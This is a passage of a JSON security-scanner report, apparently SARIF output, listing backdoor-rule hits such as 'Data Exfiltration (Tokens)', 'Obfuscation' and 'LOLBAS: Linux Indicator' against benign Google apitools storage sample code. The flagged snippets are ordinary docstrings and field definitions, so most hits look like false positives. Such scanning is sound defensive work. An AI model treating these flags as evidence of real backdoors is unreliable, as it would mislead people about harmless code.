                      "markdown": "`\n\nclass Channel(_messages.Message):\n  r\"\"\"An notification channel used to watch for resource changes.\n\n  Messages:\n    ParamsValue: Additional parameters controlling delivery channel behavior.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1/storage_v1_messages.py"
                },
                "region": {
                  "startLine": 195,
                  "startColumn": 60,
                  "endLine": 195,
                  "endColumn": 69,
                  "snippet": {
                    "text": "        attempt to retrieve the resulting object. This allows the creation of\n        index.html objects to represent directory pages.\n      notFoundPage: If the requested object path is missing, and any\n        mainPageSuffix object is missing, if applicable, the service will\n        return the named object from this bucket as the content for a 404 Not\n        Found result.\n    \"\"\"\n",
                    "rendered": {
                      "text": "        attempt to retrieve the resulting object. This allows the creation of\n        index.html objects to represent directory pages.\n      notFoundPage: If the requested object path is missing, and any\n        mainPageSuffix object is missing, if applicable, the service will\n        return the named object from this bucket as the content for a 404 Not\n        Found result.\n    \"\"\"\n",
                      "markdown": "`        attempt to retrieve the resulting object. This allows the creation of\n        index.html objects to represent directory pages.\n      notFoundPage: If the requested object path is missing, and any\n        mainPageSuffix object is missing, if applicable, the service will\n        return the named object from this bucket as the content for a 404 Not\n        Found result.\n    \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1/storage_v1_messages.py"
                },
                "region": {
                  "startLine": 190,
                  "startColumn": 66,
                  "endLine": 191,
                  "snippet": {
                    "text": "    Website Examples for more information.\n\n    Fields:\n      mainPageSuffix: If the requested object path is missing, the service\n        will ensure the path has a trailing '/', append this suffix, and\n        attempt to retrieve the resulting object. This allows the creation of\n        index.html objects to represent directory pages.\n      notFoundPage: If the requested object path is missing, and any\n",
                    "rendered": {
                      "text": "    Website Examples for more information.\n\n    Fields:\n      mainPageSuffix: If the requested object path is missing, the service\n        will ensure the path has a trailing '/', append this suffix, and\n        attempt to retrieve the resulting object. This allows the creation of\n        index.html objects to represent directory pages.\n      notFoundPage: If the requested object path is missing, and any\n",
                      "markdown": "`    Website Examples for more information.\n\n    Fields:\n      mainPageSuffix: If the requested object path is missing, the service\n        will ensure the path has a trailing '/', append this suffix, and\n        attempt to retrieve the resulting object. This allows the creation of\n        index.html objects to represent directory pages.\n      notFoundPage: If the requested object path is missing, and any\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1/storage_v1_messages.py"
                },
                "region": {
                  "startLine": 185,
                  "startColumn": 63,
                  "endLine": 186,
                  "snippet": {
                    "text": "    enabled = _messages.BooleanField(1)\n\n  class WebsiteValue(_messages.Message):\n    r\"\"\"The bucket's website configuration, controlling how the service\n    behaves when accessing bucket contents as a web site. See the Static\n    Website Examples for more information.\n\n    Fields:\n",
                    "rendered": {
                      "text": "    enabled = _messages.BooleanField(1)\n\n  class WebsiteValue(_messages.Message):\n    r\"\"\"The bucket's website configuration, controlling how the service\n    behaves when accessing bucket contents as a web site. See the Static\n    Website Examples for more information.\n\n    Fields:\n",
                      "markdown": "`    enabled = _messages.BooleanField(1)\n\n  class WebsiteValue(_messages.Message):\n    r\"\"\"The bucket's website configuration, controlling how the service\n    behaves when accessing bucket contents as a web site. See the Static\n    Website Examples for more information.\n\n    Fields:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1/storage_v1_messages.py"
                },
                "region": {
                  "startLine": 64,
                  "startColumn": 68,
                  "endLine": 65,
                  "snippet": {
                    "text": "    timeCreated: The creation time of the bucket in RFC 3339 format.\n    updated: The modification time of the bucket in RFC 3339 format.\n    versioning: The bucket's versioning configuration.\n    website: The bucket's website configuration, controlling how the service\n      behaves when accessing bucket contents as a web site. See the Static\n      Website Examples for more information.\n  \"\"\"\n\n",
                    "rendered": {
                      "text": "    timeCreated: The creation time of the bucket in RFC 3339 format.\n    updated: The modification time of the bucket in RFC 3339 format.\n    versioning: The bucket's versioning configuration.\n    website: The bucket's website configuration, controlling how the service\n      behaves when accessing bucket contents as a web site. See the Static\n      Website Examples for more information.\n  \"\"\"\n\n",
                      "markdown": "`    timeCreated: The creation time of the bucket in RFC 3339 format.\n    updated: The modification time of the bucket in RFC 3339 format.\n    versioning: The bucket's versioning configuration.\n    website: The bucket's website configuration, controlling how the service\n      behaves when accessing bucket contents as a web site. See the Static\n      Website Examples for more information.\n  \"\"\"\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1/storage_v1_messages.py"
                },
                "region": {
                  "startLine": 62,
                  "startColumn": 29,
                  "endLine": 62,
                  "endColumn": 35,
                  "snippet": {
                    "text": "      include STANDARD, NEARLINE and DURABLE_REDUCED_AVAILABILITY. Defaults to\n      STANDARD. For more information, see storage classes.\n    timeCreated: The creation time of the bucket in RFC 3339 format.\n    updated: The modification time of the bucket in RFC 3339 format.\n    versioning: The bucket's versioning configuration.\n    website: The bucket's website configuration, controlling how the service\n      behaves when accessing bucket contents as a web site. See the Static\n",
                    "rendered": {
                      "text": "      include STANDARD, NEARLINE and DURABLE_REDUCED_AVAILABILITY. Defaults to\n      STANDARD. For more information, see storage classes.\n    timeCreated: The creation time of the bucket in RFC 3339 format.\n    updated: The modification time of the bucket in RFC 3339 format.\n    versioning: The bucket's versioning configuration.\n    website: The bucket's website configuration, controlling how the service\n      behaves when accessing bucket contents as a web site. See the Static\n",
                      "markdown": "`      include STANDARD, NEARLINE and DURABLE_REDUCED_AVAILABILITY. Defaults to\n      STANDARD. For more information, see storage classes.\n    timeCreated: The creation time of the bucket in RFC 3339 format.\n    updated: The modification time of the bucket in RFC 3339 format.\n    versioning: The bucket's versioning configuration.\n    website: The bucket's website configuration, controlling how the service\n      behaves when accessing bucket contents as a web site. See the Static\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1/storage_v1_messages.py"
                },
                "region": {
                  "startLine": 61,
                  "startColumn": 29,
                  "endLine": 61,
                  "endColumn": 35,
                  "snippet": {
                    "text": "      bucket are stored and determines the SLA and the cost of storage. Values\n      include STANDARD, NEARLINE and DURABLE_REDUCED_AVAILABILITY. Defaults to\n      STANDARD. For more information, see storage classes.\n    timeCreated: The creation time of the bucket in RFC 3339 format.\n    updated: The modification time of the bucket in RFC 3339 format.\n    versioning: The bucket's versioning configuration.\n    website: The bucket's website configuration, controlling how the service\n",
                    "rendered": {
                      "text": "      bucket are stored and determines the SLA and the cost of storage. Values\n      include STANDARD, NEARLINE and DURABLE_REDUCED_AVAILABILITY. Defaults to\n      STANDARD. For more information, see storage classes.\n    timeCreated: The creation time of the bucket in RFC 3339 format.\n    updated: The modification time of the bucket in RFC 3339 format.\n    versioning: The bucket's versioning configuration.\n    website: The bucket's website configuration, controlling how the service\n",
                      "markdown": "`      bucket are stored and determines the SLA and the cost of storage. Values\n      include STANDARD, NEARLINE and DURABLE_REDUCED_AVAILABILITY. Defaults to\n      STANDARD. For more information, see storage classes.\n    timeCreated: The creation time of the bucket in RFC 3339 format.\n    updated: The modification time of the bucket in RFC 3339 format.\n    versioning: The bucket's versioning configuration.\n    website: The bucket's website configuration, controlling how the service\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1/storage_v1_messages.py"
                },
                "region": {
                  "startLine": 32,
                  "startColumn": 5,
                  "endLine": 32,
                  "endColumn": 14,
                  "snippet": {
                    "text": "      owner group.\n    VersioningValue: The bucket's versioning configuration.\n    WebsiteValue: The bucket's website configuration, controlling how the\n      service behaves when accessing bucket contents as a web site. See the\n      Static Website Examples for more information.\n\n  Fields:\n",
                    "rendered": {
                      "text": "      owner group.\n    VersioningValue: The bucket's versioning configuration.\n    WebsiteValue: The bucket's website configuration, controlling how the\n      service behaves when accessing bucket contents as a web site. See the\n      Static Website Examples for more information.\n\n  Fields:\n",
                      "markdown": "`      owner group.\n    VersioningValue: The bucket's versioning configuration.\n    WebsiteValue: The bucket's website configuration, controlling how the\n      service behaves when accessing bucket contents as a web site. See the\n      Static Website Examples for more information.\n\n  Fields:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1/storage_v1_messages.py"
                },
                "region": {
                  "startLine": 531,
                  "startColumn": 49,
                  "endLine": 531,
                  "endColumn": 55,
                  "snippet": {
                    "text": "    id: The ID of the object.\n    kind: The kind of item this is. For objects, this is always\n      storage#object.\n    md5Hash: MD5 hash of the data; encoded using base64. For more information\n      about using the MD5 hash, see Hashes and ETags: Best Practices.\n    mediaLink: Media download link.\n    metadata: User-provided metadata, in key/value pairs.\n",
                    "rendered": {
                      "text": "    id: The ID of the object.\n    kind: The kind of item this is. For objects, this is always\n      storage#object.\n    md5Hash: MD5 hash of the data; encoded using base64. For more information\n      about using the MD5 hash, see Hashes and ETags: Best Practices.\n    mediaLink: Media download link.\n    metadata: User-provided metadata, in key/value pairs.\n",
                      "markdown": "`    id: The ID of the object.\n    kind: The kind of item this is. For objects, this is always\n      storage#object.\n    md5Hash: MD5 hash of the data; encoded using base64. For more information\n      about using the MD5 hash, see Hashes and ETags: Best Practices.\n    mediaLink: Media download link.\n    metadata: User-provided metadata, in key/value pairs.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1/storage_v1_messages.py"
                },
                "region": {
                  "startLine": 521,
                  "startColumn": 12,
                  "endLine": 521,
                  "endColumn": 18,
                  "snippet": {
                    "text": "    contentType: Content-Type of the object data. If contentType is not\n      specified, object downloads will be served as application/octet-stream.\n    crc32c: CRC32c checksum, as described in RFC 4960, Appendix B; encoded\n      using base64 in big-endian byte order. For more information about using\n      the CRC32c checksum, see Hashes and ETags: Best Practices.\n    customerEncryption: Metadata of customer-supplied encryption key, if the\n      object is encrypted by such a key.\n",
                    "rendered": {
                      "text": "    contentType: Content-Type of the object data. If contentType is not\n      specified, object downloads will be served as application/octet-stream.\n    crc32c: CRC32c checksum, as described in RFC 4960, Appendix B; encoded\n      using base64 in big-endian byte order. For more information about using\n      the CRC32c checksum, see Hashes and ETags: Best Practices.\n    customerEncryption: Metadata of customer-supplied encryption key, if the\n      object is encrypted by such a key.\n",
                      "markdown": "`    contentType: Content-Type of the object data. If contentType is not\n      specified, object downloads will be served as application/octet-stream.\n    crc32c: CRC32c checksum, as described in RFC 4960, Appendix B; encoded\n      using base64 in big-endian byte order. For more information about using\n      the CRC32c checksum, see Hashes and ETags: Best Practices.\n    customerEncryption: Metadata of customer-supplied encryption key, if the\n      object is encrypted by such a key.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1/storage_v1_messages.py"
                },
                "region": {
                  "startLine": 1275,
                  "startColumn": 51,
                  "endLine": 1275,
                  "endColumn": 94,
                  "snippet": {
                    "text": "  ifMetagenerationMatch = _messages.IntegerField(3)\n  ifMetagenerationNotMatch = _messages.IntegerField(4)\n  predefinedAcl = _messages.EnumField('PredefinedAclValueValuesEnum', 5)\n  predefinedDefaultObjectAcl = _messages.EnumField('PredefinedDefaultObjectAclValueValuesEnum', 6)\n  projection = _messages.EnumField('ProjectionValueValuesEnum', 7)\n\n\n",
                    "rendered": {
                      "text": "  ifMetagenerationMatch = _messages.IntegerField(3)\n  ifMetagenerationNotMatch = _messages.IntegerField(4)\n  predefinedAcl = _messages.EnumField('PredefinedAclValueValuesEnum', 5)\n  predefinedDefaultObjectAcl = _messages.EnumField('PredefinedDefaultObjectAclValueValuesEnum', 6)\n  projection = _messages.EnumField('ProjectionValueValuesEnum', 7)\n\n\n",
                      "markdown": "`  ifMetagenerationMatch = _messages.IntegerField(3)\n  ifMetagenerationNotMatch = _messages.IntegerField(4)\n  predefinedAcl = _messages.EnumField('PredefinedAclValueValuesEnum', 5)\n  predefinedDefaultObjectAcl = _messages.EnumField('PredefinedDefaultObjectAclValueValuesEnum', 6)\n  projection = _messages.EnumField('ProjectionValueValuesEnum', 7)\n\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1/storage_v1_messages.py"
                },
                "region": {
                  "startLine": 1164,
                  "startColumn": 51,
                  "endLine": 1164,
                  "endColumn": 94,
                  "snippet": {
                    "text": "  ifMetagenerationMatch = _messages.IntegerField(3)\n  ifMetagenerationNotMatch = _messages.IntegerField(4)\n  predefinedAcl = _messages.EnumField('PredefinedAclValueValuesEnum', 5)\n  predefinedDefaultObjectAcl = _messages.EnumField('PredefinedDefaultObjectAclValueValuesEnum', 6)\n  projection = _messages.EnumField('ProjectionValueValuesEnum', 7)\n\n\n",
                    "rendered": {
                      "text": "  ifMetagenerationMatch = _messages.IntegerField(3)\n  ifMetagenerationNotMatch = _messages.IntegerField(4)\n  predefinedAcl = _messages.EnumField('PredefinedAclValueValuesEnum', 5)\n  predefinedDefaultObjectAcl = _messages.EnumField('PredefinedDefaultObjectAclValueValuesEnum', 6)\n  projection = _messages.EnumField('ProjectionValueValuesEnum', 7)\n\n\n",
                      "markdown": "`  ifMetagenerationMatch = _messages.IntegerField(3)\n  ifMetagenerationNotMatch = _messages.IntegerField(4)\n  predefinedAcl = _messages.EnumField('PredefinedAclValueValuesEnum', 5)\n  predefinedDefaultObjectAcl = _messages.EnumField('PredefinedDefaultObjectAclValueValuesEnum', 6)\n  projection = _messages.EnumField('ProjectionValueValuesEnum', 7)\n\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1/storage_v1_messages.py"
                },
                "region": {
                  "startLine": 1044,
                  "startColumn": 51,
                  "endLine": 1044,
                  "endColumn": 94,
                  "snippet": {
                    "text": "\n  bucket = _messages.MessageField('Bucket', 1)\n  predefinedAcl = _messages.EnumField('PredefinedAclValueValuesEnum', 2)\n  predefinedDefaultObjectAcl = _messages.EnumField('PredefinedDefaultObjectAclValueValuesEnum', 3)\n  project = _messages.StringField(4, required=True)\n  projection = _messages.EnumField('ProjectionValueValuesEnum', 5)\n\n",
                    "rendered": {
                      "text": "\n  bucket = _messages.MessageField('Bucket', 1)\n  predefinedAcl = _messages.EnumField('PredefinedAclValueValuesEnum', 2)\n  predefinedDefaultObjectAcl = _messages.EnumField('PredefinedDefaultObjectAclValueValuesEnum', 3)\n  project = _messages.StringField(4, required=True)\n  projection = _messages.EnumField('ProjectionValueValuesEnum', 5)\n\n",
                      "markdown": "`\n  bucket = _messages.MessageField('Bucket', 1)\n  predefinedAcl = _messages.EnumField('PredefinedAclValueValuesEnum', 2)\n  predefinedDefaultObjectAcl = _messages.EnumField('PredefinedDefaultObjectAclValueValuesEnum', 3)\n  project = _messages.StringField(4, required=True)\n  projection = _messages.EnumField('ProjectionValueValuesEnum', 5)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1/storage_v1_messages.py"
                },
                "region": {
                  "startLine": 852,
                  "startColumn": 3,
                  "endLine": 852,
                  "endColumn": 13,
                  "snippet": {
                    "text": "  alt = _messages.EnumField('AltValueValuesEnum', 1, default='json')\n  fields = _messages.StringField(2)\n  key = _messages.StringField(3)\n  oauth_token = _messages.StringField(4)\n  prettyPrint = _messages.BooleanField(5, default=True)\n  quotaUser = _messages.StringField(6)\n  trace = _messages.StringField(7)\n",
                    "rendered": {
                      "text": "  alt = _messages.EnumField('AltValueValuesEnum', 1, default='json')\n  fields = _messages.StringField(2)\n  key = _messages.StringField(3)\n  oauth_token = _messages.StringField(4)\n  prettyPrint = _messages.BooleanField(5, default=True)\n  quotaUser = _messages.StringField(6)\n  trace = _messages.StringField(7)\n",
                      "markdown": "`  alt = _messages.EnumField('AltValueValuesEnum', 1, default='json')\n  fields = _messages.StringField(2)\n  key = _messages.StringField(3)\n  oauth_token = _messages.StringField(4)\n  prettyPrint = _messages.BooleanField(5, default=True)\n  quotaUser = _messages.StringField(6)\n  trace = _messages.StringField(7)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1/storage_v1_messages.py"
                },
                "region": {
                  "startLine": 830,
                  "startColumn": 5,
                  "endLine": 830,
                  "endColumn": 15,
                  "snippet": {
                    "text": "    key: API key. Your API key identifies your project and provides you with\n      API access, quota, and reports. Required unless you provide an OAuth 2.0\n      token.\n    oauth_token: OAuth 2.0 token for the current user.\n    prettyPrint: Returns response with indentations and line breaks.\n    quotaUser: Available to use for quota purposes for server-side\n      applications. Can be any arbitrary string assigned to a user, but should\n",
                    "rendered": {
                      "text": "    key: API key. Your API key identifies your project and provides you with\n      API access, quota, and reports. Required unless you provide an OAuth 2.0\n      token.\n    oauth_token: OAuth 2.0 token for the current user.\n    prettyPrint: Returns response with indentations and line breaks.\n    quotaUser: Available to use for quota purposes for server-side\n      applications. Can be any arbitrary string assigned to a user, but should\n",
                      "markdown": "`    key: API key. Your API key identifies your project and provides you with\n      API access, quota, and reports. Required unless you provide an OAuth 2.0\n      token.\n    oauth_token: OAuth 2.0 token for the current user.\n    prettyPrint: Returns response with indentations and line breaks.\n    quotaUser: Available to use for quota purposes for server-side\n      applications. Can be any arbitrary string assigned to a user, but should\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1/storage_v1_client.py"
                },
                "region": {
                  "startLine": 11,
                  "startColumn": 33,
                  "endLine": 11,
                  "endColumn": 42,
                  "snippet": {
                    "text": "\n\nclass StorageV1(base_api.BaseApiClient):\n  \"\"\"Generated client library for service storage version v1.\"\"\"\n\n  MESSAGES_MODULE = messages\n  BASE_URL = 'https://www.googleapis.com/storage/v1/'\n",
                    "rendered": {
                      "text": "\n\nclass StorageV1(base_api.BaseApiClient):\n  \"\"\"Generated client library for service storage version v1.\"\"\"\n\n  MESSAGES_MODULE = messages\n  BASE_URL = 'https://www.googleapis.com/storage/v1/'\n",
                      "markdown": "`\n\nclass StorageV1(base_api.BaseApiClient):\n  \"\"\"Generated client library for service storage version v1.\"\"\"\n\n  MESSAGES_MODULE = messages\n  BASE_URL = 'https://www.googleapis.com/storage/v1/'\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1/storage_v1_client.py"
                },
                "region": {
                  "startLine": 937,
                  "startColumn": 26,
                  "endLine": 937,
                  "endColumn": 68,
                  "snippet": {
                    "text": "        query_params=['generation'],\n        relative_path='b/{bucket}/o/{object}/acl/{entity}',\n        request_field='objectAccessControl',\n        request_type_name='StorageObjectAccessControlsUpdateRequest',\n        response_type_name='ObjectAccessControl',\n        supports_download=False,\n    )\n",
                    "rendered": {
                      "text": "        query_params=['generation'],\n        relative_path='b/{bucket}/o/{object}/acl/{entity}',\n        request_field='objectAccessControl',\n        request_type_name='StorageObjectAccessControlsUpdateRequest',\n        response_type_name='ObjectAccessControl',\n        supports_download=False,\n    )\n",
                      "markdown": "`        query_params=['generation'],\n        relative_path='b/{bucket}/o/{object}/acl/{entity}',\n        request_field='objectAccessControl',\n        request_type_name='StorageObjectAccessControlsUpdateRequest',\n        response_type_name='ObjectAccessControl',\n        supports_download=False,\n    )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1/storage_v1_client.py"
                },
                "region": {
                  "startLine": 859,
                  "startColumn": 26,
                  "endLine": 859,
                  "endColumn": 68,
                  "snippet": {
                    "text": "        query_params=['generation'],\n        relative_path='b/{bucket}/o/{object}/acl',\n        request_field='objectAccessControl',\n        request_type_name='StorageObjectAccessControlsInsertRequest',\n        response_type_name='ObjectAccessControl',\n        supports_download=False,\n    )\n",
                    "rendered": {
                      "text": "        query_params=['generation'],\n        relative_path='b/{bucket}/o/{object}/acl',\n        request_field='objectAccessControl',\n        request_type_name='StorageObjectAccessControlsInsertRequest',\n        response_type_name='ObjectAccessControl',\n        supports_download=False,\n    )\n",
                      "markdown": "`        query_params=['generation'],\n        relative_path='b/{bucket}/o/{object}/acl',\n        request_field='objectAccessControl',\n        request_type_name='StorageObjectAccessControlsInsertRequest',\n        response_type_name='ObjectAccessControl',\n        supports_download=False,\n    )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1/storage_v1_client.py"
                },
                "region": {
                  "startLine": 808,
                  "startColumn": 27,
                  "endLine": 808,
                  "endColumn": 70,
                  "snippet": {
                    "text": "        relative_path='b/{bucket}/o/{object}/acl/{entity}',\n        request_field='',\n        request_type_name='StorageObjectAccessControlsDeleteRequest',\n        response_type_name='StorageObjectAccessControlsDeleteResponse',\n        supports_download=False,\n    )\n\n",
                    "rendered": {
                      "text": "        relative_path='b/{bucket}/o/{object}/acl/{entity}',\n        request_field='',\n        request_type_name='StorageObjectAccessControlsDeleteRequest',\n        response_type_name='StorageObjectAccessControlsDeleteResponse',\n        supports_download=False,\n    )\n\n",
                      "markdown": "`        relative_path='b/{bucket}/o/{object}/acl/{entity}',\n        request_field='',\n        request_type_name='StorageObjectAccessControlsDeleteRequest',\n        response_type_name='StorageObjectAccessControlsDeleteResponse',\n        supports_download=False,\n    )\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1/storage_v1_client.py"
                },
                "region": {
                  "startLine": 807,
                  "startColumn": 26,
                  "endLine": 807,
                  "endColumn": 68,
                  "snippet": {
                    "text": "        query_params=['generation'],\n        relative_path='b/{bucket}/o/{object}/acl/{entity}',\n        request_field='',\n        request_type_name='StorageObjectAccessControlsDeleteRequest',\n        response_type_name='StorageObjectAccessControlsDeleteResponse',\n        supports_download=False,\n    )\n",
                    "rendered": {
                      "text": "        query_params=['generation'],\n        relative_path='b/{bucket}/o/{object}/acl/{entity}',\n        request_field='',\n        request_type_name='StorageObjectAccessControlsDeleteRequest',\n        response_type_name='StorageObjectAccessControlsDeleteResponse',\n        supports_download=False,\n    )\n",
                      "markdown": "`        query_params=['generation'],\n        relative_path='b/{bucket}/o/{object}/acl/{entity}',\n        request_field='',\n        request_type_name='StorageObjectAccessControlsDeleteRequest',\n        response_type_name='StorageObjectAccessControlsDeleteResponse',\n        supports_download=False,\n    )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1/storage_v1_client.py"
                },
                "region": {
                  "startLine": 605,
                  "startColumn": 26,
                  "endLine": 605,
                  "endColumn": 73,
                  "snippet": {
                    "text": "        query_params=['ifMetagenerationMatch', 'ifMetagenerationNotMatch'],\n        relative_path='b/{bucket}/defaultObjectAcl',\n        request_field='',\n        request_type_name='StorageDefaultObjectAccessControlsListRequest',\n        response_type_name='ObjectAccessControls',\n        supports_download=False,\n    )\n",
                    "rendered": {
